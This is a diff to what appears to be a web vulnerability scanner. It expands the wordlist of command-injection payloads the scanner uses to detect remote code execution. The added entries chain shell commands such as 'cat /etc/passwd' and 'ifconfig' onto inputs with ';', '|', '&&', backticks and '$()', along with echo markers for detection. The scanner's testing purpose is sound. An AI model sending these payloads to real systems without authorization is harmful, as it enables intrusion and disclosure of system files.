@@ -794,10 +794,18 @@ def all_list(urls, c, cl, cr, x, xe, l, s, r, rc, sr, sst, fname, o,
                 '| ifconfig',
                 '& ifconfig',
                 '&& ifconfig',
-                'system("cat /etc/passwd");',
-                '| echo Neluxmatizer',
-                '; echo Neluxmatizer',
-                '&& echo Neluxmatizer'
+                '; ifconfig',
+                '`ifconfig`',
+                '$(ifconfig)',
+                '; cat /etc/passwd',
+                '| cat /etc/passwd',
+                '&& cat /etc/passwd',
+                # marcador numérico único — aparece en respuesta solo si el shell lo ejecuta
+                '| echo 3141592653589793',
+                '; echo 3141592653589793',
+                '&& echo 3141592653589793',
+                '`echo 3141592653589793`',
+                '$(echo 3141592653589793)',
             ]
             rce_vulns = rce(urip, urif, wordlist, [], threads, custom_headers, random_agent)
             vulnerabilities_by_type['RCE'].extend(rce_vulns)
